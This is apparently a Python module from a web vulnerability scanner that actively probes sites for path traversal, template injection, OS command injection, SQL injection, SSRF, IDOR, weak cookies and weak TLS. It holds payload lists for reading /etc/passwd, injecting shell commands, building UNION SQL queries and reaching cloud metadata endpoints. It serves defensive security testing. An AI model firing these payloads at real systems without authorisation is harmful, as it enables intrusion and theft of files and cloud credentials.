"""
Extended conventional web-vulnerability checks — moving SURFACE's classic-vuln
coverage toward a DAST-class engine.

Adds detection for vulnerability classes the base VulnerabilityTester did not
cover: path traversal / LFI, OS command injection, server-side template
injection (SSTI), UNION-based and boolean-blind SQL injection, insecure cookie
flags, TLS/transport weaknesses, SSRF, and IDOR.

Every detector follows the project principle — *code observes → code confirms*:
a finding is only "Confirmed" when the response carries deterministic evidence
that the payload was interpreted (file-content signatures, evaluated arithmetic,
reflected command-output markers, timing oracles double-checked against a
baseline, TLS handshake facts, response headers). Checks that cannot be proven
without authenticated/OOB context (SSRF without a collaborator, IDOR without a
second identity) are reported as "Potential", never blindly Confirmed.

This module composes over an existing VulnerabilityTester instance so it reuses
the same async HTTP plumbing, auth cookie, evidence format, and scope handling.
"""
import re
import ssl
import time
import socket
import asyncio
import logging
import urllib.parse
from datetime import datetime, timezone
from typing import Dict, List, Optional, Tuple

from .vulnerability_tester import _finding, _evidence, _context

logger = logging.getLogger(__name__)


# --------------------------------------------------------------------------
# Payloads / signatures
# --------------------------------------------------------------------------

_TRAVERSAL_MARK = "surfacelfi"

PATH_TRAVERSAL_PAYLOADS = [
    "../../../../../../../../etc/passwd",
    "....//....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/etc/passwd",
    "../../../../../../../../etc/passwd%00",
    "..\\..\\..\\..\\..\\..\\windows\\win.ini",
    "..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
]

# Signatures that only appear if a real system file was actually served.
_LFI_SIGNATURES = [
    (re.compile(r"root:.*?:0:0:", re.M), "Linux /etc/passwd"),
    (re.compile(r"daemon:.*?:/usr/sbin", re.M), "Linux /etc/passwd"),
    (re.compile(r"\[fonts\]|\[extensions\]|for 16-bit app support", re.I), "Windows win.ini"),
]

# SSTI polyglots use a distinctive product so an evaluated result cannot be a
# coincidental substring. 123*456 = 56088, and the literal payload must be
# absent from the response to prove evaluation (not mere reflection).
_SSTI_PROBE = ("123", "456", "56088")
SSTI_PAYLOADS = [
    "{{123*456}}",
    "${123*456}",
    "#{123*456}",
    "<%= 123*456 %>",
    "{123*456}",
    "${{123*456}}",
    "#{ 123*456 }",
]

_CMDI_MARK = "SURFACECMDi"
CMDI_ECHO_PAYLOADS = [
    f"; echo {_CMDI_MARK}",
    f"| echo {_CMDI_MARK}",
    f"& echo {_CMDI_MARK}",
    f"`echo {_CMDI_MARK}`",
    f"$(echo {_CMDI_MARK})",
    f"%0aecho {_CMDI_MARK}",
]
_CMDI_SLEEP = 5
CMDI_TIME_PAYLOADS = [
    f"; sleep {_CMDI_SLEEP}",
    f"| sleep {_CMDI_SLEEP}",
    f"$(sleep {_CMDI_SLEEP})",
    f"`sleep {_CMDI_SLEEP}`",
    f"& ping -n {_CMDI_SLEEP + 1} 127.0.0.1",
]

_SQLI_ERROR_RE = re.compile(
    r"SQL syntax|mysql_|ORA-\d{5}|PostgreSQL.*ERROR|SQLite.*error|SQLSTATE\[|"
    r"Unclosed quotation mark|ODBC SQL Server|syntax error at or near|"
    r"sqlite3\.OperationalError|com\.mysql\.jdbc",
    re.I,
)
_SQLI_UNION_MARK = "0xSURFACEUNION"

# Network-fetch oriented parameter names (SSRF-prone). Kept deliberately narrow
# to avoid flooding output with low-signal "Potential SSRF" on generic params.
_URLISH_PARAM_KWS = ("url", "uri", "src", "dest", "redirect", "callback",
                     "webhook", "proxy", "fetch", "domain", "host", "site",
                     "link", "target", "feed", "remote", "endpoint", "upstream")

_IDISH_PARAM_KWS = ("id", "uid", "user", "userid", "account", "acct", "order",
                    "orderid", "doc", "docid", "file", "fileid", "invoice",
                    "num", "no", "pid", "gid", "key", "record", "ref")

_METADATA_SIGNATURES = [
    re.compile(r"ami-id|instance-id|iam/security-credentials|meta-data", re.I),
    re.compile(r"computeMetadata|project/project-id", re.I),
]

_SESSION_COOKIE_KWS = ("sess", "sid", "auth", "token", "jwt", "login", "id",
                       "csrf", "remember")


class ExtendedVulnScanner:
    """Composes over a VulnerabilityTester for HTTP plumbing + evidence format."""

    def __init__(self, tester, max_points: int = 60):
        self.t = tester
        self.max_urls   = getattr(tester, "max_urls", 120)
        self.max_forms  = getattr(tester, "max_forms", 40)
        self.max_params = getattr(tester, "max_params_per_url", 12)
        # Hard bound on injection points examined per detector so a large site
        # cannot make any single active check run unboundedly.
        self.max_points = max_points

    # -- injection-point enumeration -------------------------------------

    def _url_points(self, urls: List[str]):
        count = 0
        for url in urls[:self.max_urls]:
            if "?" not in url:
                continue
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            for name in list(params)[:self.max_params]:
                if count >= self.max_points:
                    return
                count += 1
                yield url, parsed, name

    def _inject_url(self, parsed, name: str, value: str) -> str:
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        qs[name] = [value]
        return urllib.parse.urlunparse(
            parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)))

    def _form_points(self, forms: List[Dict]):
        count = 0
        for form in forms[:self.max_forms]:
            action = form.get("action", "")
            if not action:
                continue
            method = (form.get("method", "get") or "get").lower()
            inputs = form.get("inputs") or form.get("fields") or []
            names = [i.get("name") for i in inputs
                     if isinstance(i, dict) and i.get("name")
                     and str(i.get("type", "text")).lower() not in
                     ("submit", "button", "file", "image", "reset")]
            for name in names[:self.max_params]:
                if count >= self.max_points:
                    return
                count += 1
                yield action, method, name, names

    # -- aggregate entry point -------------------------------------------

    async def run_all(self, forms: List[Dict], urls: List[str],
                      base_url: str, shared_headers: Optional[Dict] = None,
                      verbose: bool = False) -> List[Dict]:
        tasks = [
            self.test_path_traversal(forms, urls, verbose),
            self.test_ssti(forms, urls, verbose),
            self.test_command_injection(forms, urls, verbose),
            self.test_sqli_union_boolean(urls, verbose),
            self.test_cookie_flags(base_url, shared_headers, verbose),
            self.test_transport_security(base_url, verbose),
            self.test_ssrf(urls, verbose),
            self.test_idor(urls, verbose),
        ]
        out: List[Dict] = []
        for r in await asyncio.gather(*tasks, return_exceptions=True):
            if isinstance(r, list):
                out.extend(r)
            elif isinstance(r, Exception):
                logger.debug("extended check failed: %s", r)
        return out

    # -- helpers ----------------------------------------------------------

    async def _get(self, url: str, method: str = "get", data: Dict = None,
                   timeout: float = None) -> Tuple[int, Dict, str]:
        status, headers, body = await self.t._http_request(
            url, method, data, timeout=timeout)
        return status, headers or {}, body or ""

    # ====================================================================
    # Path Traversal / LFI
    # ====================================================================

    async def test_path_traversal(self, forms, urls, verbose=False) -> List[Dict]:
        findings: List[Dict] = []
        seen = set()

        async def probe(location, param, send):
            if (location, param) in seen:
                return
            for payload in PATH_TRAVERSAL_PAYLOADS:
                try:
                    status, _, body = await send(payload)
                except Exception:
                    continue
                for rx, label in _LFI_SIGNATURES:
                    if rx.search(body or ""):
                        seen.add((location, param))
                        findings.append(_finding(
                            vuln_type   = "Path Traversal / Local File Inclusion",
                            severity    = "Critical",
                            status      = "Confirmed",
                            location    = location,
                            parameter   = param,
                            details     = f"Retrieved system file content ({label}) via '{param}'.",
                            poc         = payload,
                            cwe         = "CWE-22",
                            impact      = "Attacker can read arbitrary files on the server.",
                            remediation = ("Reject path separators in user input; resolve and "
                                           "canonicalise paths against an allowlisted base dir."),
                            evidence    = _evidence(
                                request      = f"{location} [{param}={payload}]",
                                status       = status,
                                body_snippet = (body or "")[:300],
                                reflected    = True, verified = True,
                                confidence   = "High", method = "http_body",
                            ),
                        ))
                        return

        for url, parsed, name in self._url_points(urls):
            async def send(p, u=url, ps=parsed, n=name):
                return await self._get(self._inject_url(ps, n, p))
            await probe(url, name, send)

        for action, method, name, names in self._form_points(forms):
            async def send(p, a=action, m=method, n=name, ns=names):
                data = {fn: (p if fn == n else "test") for fn in ns}
                return await self._get(a, m, data)
            await probe(action, name, send)

        return findings

    # ====================================================================
    # SSTI
    # ====================================================================

    async def test_ssti(self, forms, urls, verbose=False) -> List[Dict]:
        findings: List[Dict] = []
        seen = set()
        _, _, expected = _SSTI_PROBE

        async def probe(location, param, send):
            if (location, param) in seen:
                return
            for payload in SSTI_PAYLOADS:
                try:
                    status, _, body = await send(payload)
                except Exception:
                    continue
                b = body or ""
                # Evaluated result present AND literal payload absent => executed.
                if expected in b and payload not in b:
                    seen.add((location, param))
                    findings.append(_finding(
                        vuln_type   = "Server-Side Template Injection",
                        severity    = "Critical",
                        status      = "Confirmed",
                        location    = location,
                        parameter   = param,
                        details     = (f"Template expression evaluated: '{payload}' returned "
                                       f"'{expected}' (arithmetic executed server-side)."),
                        poc         = payload,
                        cwe         = "CWE-1336",
                        impact      = "Template injection often escalates to remote code execution.",
                        remediation = ("Never build templates from user input; use logic-less "
                                       "templates or sandboxed rendering with autoescaping."),
                        evidence    = _evidence(
                            request      = f"{location} [{param}={payload}]",
                            status       = status,
                            body_snippet = _context(b, expected),
                            reflected    = True, verified = True,
                            confidence   = "High", method = "pattern",
                        ),
                    ))
                    return

        for url, parsed, name in self._url_points(urls):
            async def send(p, ps=parsed, n=name):
                return await self._get(self._inject_url(ps, n, p))
            await probe(url, name, send)

        for action, method, name, names in self._form_points(forms):
            async def send(p, a=action, m=method, n=name, ns=names):
                data = {fn: (p if fn == n else "test") for fn in ns}
                return await self._get(a, m, data)
            await probe(action, name, send)

        return findings

    # ====================================================================
    # OS Command Injection
    # ====================================================================

    async def test_command_injection(self, forms, urls, verbose=False) -> List[Dict]:
        findings: List[Dict] = []
        seen = set()

        points = []
        for url, parsed, name in self._url_points(urls):
            points.append(("url", url, name, (parsed,)))
        for action, method, name, names in self._form_points(forms):
            points.append(("form", action, name, (method, names)))

        # cap timing probes (expensive) to a handful of points
        timing_budget = 6

        for kind, location, param, extra in points:
            if (location, param) in seen:
                continue

            async def send(p):
                if kind == "url":
                    (parsed,) = extra
                    return await self._get(self._inject_url(parsed, param, p))
                method, names = extra
                data = {fn: (p if fn == param else "test") for fn in names}
                return await self._get(location, method, data)

            # 1) reflected command-output marker (deterministic)
            confirmed = False
            for payload in CMDI_ECHO_PAYLOADS:
                try:
                    status, _, body = await send(payload)
                except Exception:
                    continue
                # marker present but NOT the literal 'echo MARK' payload (which would be reflection)
                if _CMDI_MARK in (body or "") and f"echo {_CMDI_MARK}" not in (body or ""):
                    seen.add((location, param))
                    findings.append(_finding(
                        vuln_type   = "OS Command Injection",
                        severity    = "Critical",
                        status      = "Confirmed",
                        location    = location,
                        parameter   = param,
                        details     = (f"Injected shell command output observed: 'echo' produced "
                                       f"'{_CMDI_MARK}' in the response via '{param}'."),
                        poc         = payload,
                        cwe         = "CWE-78",
                        impact      = "Attacker can execute arbitrary OS commands on the server.",
                        remediation = ("Never pass user input to a shell; use argument arrays / "
                                       "safe APIs and strict allowlists."),
                        evidence    = _evidence(
                            request      = f"{location} [{param}={payload}]",
                            status       = status,
                            body_snippet = _context(body, _CMDI_MARK),
                            reflected    = True, verified = True,
                            confidence   = "High", method = "http_body",
                        ),
                    ))
                    confirmed = True
                    break
            if confirmed:
                continue

            # 2) timing oracle (double-checked against baseline), budget-limited
            if timing_budget <= 0:
                continue
            try:
                t0 = time.monotonic()
                await send("benign")
                base_elapsed = time.monotonic() - t0
            except Exception:
                base_elapsed = 0.0
            hits = 0
            used_payload = ""
            for payload in CMDI_TIME_PAYLOADS[:3]:
                try:
                    t0 = time.monotonic()
                    await send(payload)
                    elapsed = time.monotonic() - t0
                except Exception:
                    continue
                if elapsed >= max(base_elapsed, 0.0) + (_CMDI_SLEEP * 0.8):
                    hits += 1
                    used_payload = payload
                if hits >= 2:
                    break
            timing_budget -= 1
            if hits >= 2:
                seen.add((location, param))
                findings.append(_finding(
                    vuln_type   = "OS Command Injection (Time-Based Blind)",
                    severity    = "Critical",
                    status      = "Confirmed",
                    location    = location,
                    parameter   = param,
                    details     = (f"Response delayed by ~{_CMDI_SLEEP}s on {hits} sleep payloads "
                                   f"(baseline {base_elapsed:.1f}s) via '{param}'."),
                    poc         = used_payload,
                    cwe         = "CWE-78",
                    impact      = "Blind command execution confirmed via timing oracle.",
                    remediation = "Never pass user input to a shell; use safe APIs and allowlists.",
                    evidence    = _evidence(
                        request    = f"{location} [{param}={used_payload}]",
                        status     = 0, verified = True,
                        confidence = "High", method = "timing",
                    ),
                ))

        return findings

    # ====================================================================
    # UNION + boolean-blind SQLi
    # ====================================================================

    async def test_sqli_union_boolean(self, urls, verbose=False) -> List[Dict]:
        findings: List[Dict] = []

        for url, parsed, name in self._url_points(urls):
            try:
                found = await self._sqli_union_param(url, parsed, name)
                if not found:
                    found = await self._sqli_boolean_param(url, parsed, name)
                if found:
                    findings.append(found)
            except Exception as e:
                logger.debug("sqli union/bool failed: %s", e)
        return findings

    async def _sqli_union_param(self, url, parsed, name) -> Optional[Dict]:
        # Determine column count via ORDER BY boundary, then reflect a marker
        # through UNION SELECT. Marker in response = confirmed UNION injection.
        for quote in ("'", '"', ""):
            col = 0
            for n in range(1, 9):
                payload = f"{quote} ORDER BY {n}-- -"
                status, _, body = await self._get(self._inject_url(parsed, name, payload))
                if _SQLI_ERROR_RE.search(body or ""):
                    col = n - 1
                    break
            if col < 1:
                continue
            markers = ",".join([f"'{_SQLI_UNION_MARK}'"] + ["NULL"] * (col - 1))
            payload = f"{quote} UNION SELECT {markers}-- -"
            status, _, body = await self._get(self._inject_url(parsed, name, payload))
            if _SQLI_UNION_MARK in (body or ""):
                return _finding(
                    vuln_type   = "SQL Injection (UNION-Based)",
                    severity    = "Critical",
                    status      = "Confirmed",
                    location    = url,
                    parameter   = name,
                    details     = (f"UNION SELECT reflected marker '{_SQLI_UNION_MARK}' "
                                   f"({col} columns) via '{name}'."),
                    poc         = self._inject_url(parsed, name, payload),
                    cwe         = "CWE-89",
                    impact      = "Attacker can exfiltrate arbitrary database contents.",
                    remediation = "Use parameterised queries / prepared statements.",
                    evidence    = _evidence(
                        request      = self._inject_url(parsed, name, payload),
                        status       = status,
                        body_snippet = _context(body, _SQLI_UNION_MARK),
                        reflected    = True, verified = True,
                        confidence   = "High", method = "http_body",
                    ),
                )
        return None

    async def _sqli_boolean_param(self, url, parsed, name) -> Optional[Dict]:
        base_val = urllib.parse.parse_qs(parsed.query).get(name, [""])[0]
        true_p  = f"{base_val}' AND '1'='1"
        false_p = f"{base_val}' AND '1'='2"
        s_t, _, b_t = await self._get(self._inject_url(parsed, name, true_p))
        s_f, _, b_f = await self._get(self._inject_url(parsed, name, false_p))
        s_b, _, b_b = await self._get(self._inject_url(parsed, name, base_val))
        if not (b_t and b_f):
            return None
        sim_tb = _similarity(b_t, b_b)
        sim_tf = _similarity(b_t, b_f)
        # TRUE ~ baseline, FALSE clearly diverges → boolean-blind SQLi
        if sim_tb >= 0.95 and sim_tf < 0.9 and abs(len(b_t) - len(b_f)) > 0:
            return _finding(
                vuln_type   = "SQL Injection (Boolean-Blind)",
                severity    = "High",
                status      = "Confirmed",
                location    = url,
                parameter   = name,
                details     = (f"Response tracks boolean condition: AND 1=1 matches baseline "
                               f"(sim={sim_tb:.2f}) while AND 1=2 diverges (sim={sim_tf:.2f})."),
                poc         = self._inject_url(parsed, name, true_p),
                cwe         = "CWE-89",
                impact      = "Attacker can infer database contents one condition at a time.",
                remediation = "Use parameterised queries / prepared statements.",
                evidence    = _evidence(
                    request      = f"AND 1=1 vs AND 1=2 on '{name}'",
                    status       = s_t,
                    body_snippet = (b_t or "")[:200],
                    verified     = True, confidence = "Medium", method = "differential",
                ),
            )
        return None

    # ====================================================================
    # Insecure cookie flags
    # ====================================================================

    async def test_cookie_flags(self, base_url, shared_headers, verbose=False) -> List[Dict]:
        findings: List[Dict] = []
        if not base_url:
            return findings
        cookies = await self._get_set_cookies(base_url)
        is_https = urllib.parse.urlparse(base_url).scheme == "https"
        for cookie in cookies:
            name = cookie.get("name", "")
            low  = cookie.get("raw", "").lower()
            sensitive = any(kw in name.lower() for kw in _SESSION_COOKIE_KWS)
            missing = []
            if "httponly" not in low:
                missing.append("HttpOnly")
            if is_https and "secure" not in low:
                missing.append("Secure")
            if "samesite" not in low:
                missing.append("SameSite")
            if not missing:
                continue
            sev = "Medium" if sensitive else "Low"
            findings.append(_finding(
                vuln_type   = f"Insecure Cookie Flags: {name}",
                severity    = sev,
                status      = "Confirmed",
                location    = base_url,
                parameter   = name,
                details     = f"Cookie '{name}' is missing: {', '.join(missing)}.",
                poc         = f"Set-Cookie: {cookie.get('raw', '')[:160]}",
                cwe         = "CWE-1004" if "HttpOnly" in missing else "CWE-614",
                impact      = ("Session cookie exposed to theft (XSS/HttpOnly), interception "
                               "(Secure), or CSRF (SameSite)." if sensitive else
                               "Cookie lacks recommended protection flags."),
                remediation = "Set HttpOnly, Secure, and SameSite attributes on cookies.",
                evidence    = _evidence(
                    request    = f"GET {base_url}",
                    status     = 200,
                    headers    = {"Set-Cookie": cookie.get("raw", "")},
                    verified   = True, confidence = "High", method = "header",
                ),
            ))
        return findings

    async def _get_set_cookies(self, url: str) -> List[Dict]:
        loop = asyncio.get_event_loop()

        def _fetch():
            import urllib.request, urllib.error
            headers = {"User-Agent": "Mozilla/5.0 (SecurityScanner)"}
            if getattr(self.t, "auth_cookie", ""):
                headers["Cookie"] = self.t.auth_cookie
            try:
                req = urllib.request.Request(url, headers=headers)
                with urllib.request.urlopen(req, timeout=self.t.timeout) as resp:
                    return resp.headers.get_all("Set-Cookie") or []
            except urllib.error.HTTPError as e:
                return (e.headers.get_all("Set-Cookie") or []) if e.headers else []
            except Exception:
                return []

        raw_cookies = await loop.run_in_executor(None, _fetch)
        result = []
        for raw in raw_cookies:
            cname = raw.split("=", 1)[0].strip() if "=" in raw else raw.strip()
            result.append({"name": cname, "raw": raw})
        return result

    # ====================================================================
    # Transport security (TLS / HTTPS)
    # ====================================================================

    async def test_transport_security(self, base_url, verbose=False) -> List[Dict]:
        findings: List[Dict] = []
        if not base_url:
            return findings
        parsed = urllib.parse.urlparse(base_url)
        loop = asyncio.get_event_loop()

        if parsed.scheme == "http":
            # Cleartext: is HTTPS enforced via redirect?
            try:
                status, headers, _ = await self._get(base_url)
                loc = (headers.get("Location") or headers.get("location") or "")
                enforced = status in (301, 302, 307, 308) and loc.lower().startswith("https")
            except Exception:
                enforced = False
            if not enforced:
                findings.append(_finding(
                    vuln_type   = "Cleartext Transport (No HTTPS Enforcement)",
                    severity    = "Medium",
                    status      = "Confirmed",
                    location    = base_url,
                    details     = "Application served over HTTP and does not redirect to HTTPS.",
                    poc         = f"curl -I {base_url}",
                    cwe         = "CWE-319",
                    impact      = "Traffic (credentials, cookies) can be intercepted or modified in transit.",
                    remediation = "Serve all traffic over HTTPS and redirect HTTP→HTTPS; add HSTS.",
                    evidence    = _evidence(request=f"GET {base_url}", status=200,
                                            verified=True, confidence="High", method="http_body"),
                ))
            return findings

        if parsed.scheme != "https":
            return findings

        host = parsed.hostname
        port = parsed.port or 443
        try:
            info = await loop.run_in_executor(None, lambda: _inspect_tls(host, port, self.t.timeout))
        except Exception as e:
            logger.debug("TLS inspect failed: %s", e)
            return findings

        if info.get("protocol") in ("TLSv1", "TLSv1.1", "SSLv3", "SSLv2"):
            findings.append(_finding(
                vuln_type   = f"Weak TLS Protocol: {info['protocol']}",
                severity    = "Medium",
                status      = "Confirmed",
                location    = base_url,
                details     = f"Server negotiated deprecated {info['protocol']}.",
                poc         = f"openssl s_client -connect {host}:{port}",
                cwe         = "CWE-327",
                impact      = "Deprecated TLS versions are vulnerable to known downgrade/crypto attacks.",
                remediation = "Disable TLS < 1.2; prefer TLS 1.3.",
                evidence    = _evidence(request=f"TLS handshake {host}:{port}", status=0,
                                        verified=True, confidence="High", method="tls"),
            ))
        days = info.get("days_to_expiry")
        if days is not None and days < 0:
            findings.append(_finding(
                vuln_type   = "Expired TLS Certificate",
                severity    = "High",
                status      = "Confirmed",
                location    = base_url,
                details     = f"Certificate expired {abs(days)} day(s) ago.",
                poc         = f"openssl s_client -connect {host}:{port}",
                cwe         = "CWE-298",
                impact      = "Users receive browser warnings; MITM risk if warnings are bypassed.",
                remediation = "Renew and automate certificate rotation.",
                evidence    = _evidence(request=f"TLS handshake {host}:{port}", status=0,
                                        verified=True, confidence="High", method="tls"),
            ))
        elif days is not None and days < 15:
            findings.append(_finding(
                vuln_type   = "TLS Certificate Expiring Soon",
                severity    = "Low",
                status      = "Confirmed",
                location    = base_url,
                details     = f"Certificate expires in {days} day(s).",
                poc         = f"openssl s_client -connect {host}:{port}",
                cwe         = "CWE-298",
                impact      = "Imminent outage / warnings when the certificate lapses.",
                remediation = "Renew the certificate and automate rotation.",
                evidence    = _evidence(request=f"TLS handshake {host}:{port}", status=0,
                                        verified=True, confidence="High", method="tls"),
            ))
        return findings

    # ====================================================================
    # SSRF (best-effort; Confirmed only on cloud-metadata signature)
    # ====================================================================

    async def test_ssrf(self, urls, verbose=False) -> List[Dict]:
        findings: List[Dict] = []
        payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://127.0.0.1:80/",
        ]
        for url, parsed, name in self._url_points(urls):
            if not any(kw in name.lower() for kw in _URLISH_PARAM_KWS):
                continue
            try:
                base_status, _, base_body = await self._get(
                    self._inject_url(parsed, name, "http://example.com/"))
            except Exception:
                base_status, base_body = 0, ""
            for payload in payloads:
                try:
                    status, _, body = await self._get(self._inject_url(parsed, name, payload))
                except Exception:
                    continue
                if any(rx.search(body or "") for rx in _METADATA_SIGNATURES):
                    findings.append(_finding(
                        vuln_type   = "Server-Side Request Forgery (SSRF)",
                        severity    = "Critical",
                        status      = "Confirmed",
                        location    = url,
                        parameter   = name,
                        details     = f"Server fetched cloud metadata endpoint via '{name}'.",
                        poc         = self._inject_url(parsed, name, payload),
                        cwe         = "CWE-918",
                        impact      = "Attacker can reach internal services / steal cloud credentials.",
                        remediation = ("Allowlist outbound hosts; block link-local/loopback ranges; "
                                       "disable unused URL schemes."),
                        evidence    = _evidence(
                            request      = self._inject_url(parsed, name, payload),
                            status       = status,
                            body_snippet = (body or "")[:300],
                            reflected    = True, verified = True,
                            confidence   = "High", method = "http_body",
                        ),
                    ))
                    break
            else:
                # URL-ish param exists and is fetched (server-side): report Potential
                if base_status and base_status not in (400, 404):
                    findings.append(_finding(
                        vuln_type   = "Potential SSRF",
                        severity    = "Medium",
                        status      = "Potential",
                        location    = url,
                        parameter   = name,
                        details     = (f"Parameter '{name}' appears to take a server-fetched URL. "
                                       f"No metadata leak observed; out-of-band confirmation needed."),
                        poc         = self._inject_url(parsed, name, payloads[0]),
                        cwe         = "CWE-918",
                        impact      = "If the server fetches attacker URLs, internal resources may be reachable.",
                        remediation = "Allowlist outbound hosts; block internal ranges.",
                        evidence    = _evidence(
                            request    = self._inject_url(parsed, name, "http://example.com/"),
                            status     = base_status, verified = False,
                            confidence = "Low", method = "code analysis",
                        ),
                    ))
        return findings

    # ====================================================================
    # IDOR (Potential — needs a second identity to truly confirm)
    # ====================================================================

    async def test_idor(self, urls, verbose=False) -> List[Dict]:
        findings: List[Dict] = []
        seen = set()
        for url, parsed, name in self._url_points(urls):
            if name in seen:
                continue
            if not any(kw == name.lower() or name.lower().endswith(kw)
                       for kw in _IDISH_PARAM_KWS):
                continue
            val = urllib.parse.parse_qs(parsed.query).get(name, [""])[0]
            if not re.fullmatch(r"\d+", val or ""):
                continue
            try:
                s0, _, b0 = await self._get(url)
                neighbor = str(int(val) + 1)
                s1, _, b1 = await self._get(self._inject_url(parsed, name, neighbor))
            except Exception:
                continue
            # neighbour returns a distinct, substantive 200 (not login redirect / identical)
            if s1 == 200 and b1 and _similarity(b0, b1) < 0.98 and len(b1) > 200 \
               and not re.search(r"login|sign in|unauthor|forbidden", b1, re.I):
                seen.add(name)
                findings.append(_finding(
                    vuln_type   = "Potential IDOR (Insecure Direct Object Reference)",
                    severity    = "Medium",
                    status      = "Potential",
                    location    = url,
                    parameter   = name,
                    details     = (f"Incrementing '{name}' ({val}→{neighbor}) returned a different "
                                   f"200 object without access error. Confirm with a second identity."),
                    poc         = self._inject_url(parsed, name, neighbor),
                    cwe         = "CWE-639",
                    impact      = "Users may access objects belonging to other users.",
                    remediation = "Enforce per-object authorization checks server-side.",
                    evidence    = _evidence(
                        request      = self._inject_url(parsed, name, neighbor),
                        status       = s1,
                        body_snippet = (b1 or "")[:200],
                        verified     = False, confidence = "Low", method = "differential",
                    ),
                ))
        return findings


# --------------------------------------------------------------------------
# module helpers
# --------------------------------------------------------------------------

def _similarity(a: str, b: str) -> float:
    ta = set(re.findall(r"\w+", (a or "").lower()))
    tb = set(re.findall(r"\w+", (b or "").lower()))
    if not ta and not tb:
        return 1.0
    if not ta or not tb:
        return 0.0
    return len(ta & tb) / len(ta | tb)


def _inspect_tls(host: str, port: int, timeout: float) -> Dict:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    with socket.create_connection((host, port), timeout=timeout) as sock:
        with ctx.wrap_socket(sock, server_hostname=host) as ssock:
            protocol = ssock.version()
            cert = ssock.getpeercert()
    days = None
    if cert and cert.get("notAfter"):
        try:
            exp = datetime.strptime(cert["notAfter"], "%b %d %H:%M:%S %Y %Z").replace(
                tzinfo=timezone.utc)
            days = (exp - datetime.now(timezone.utc)).days
        except Exception:
            days = None
    return {"protocol": protocol, "days_to_expiry": days}
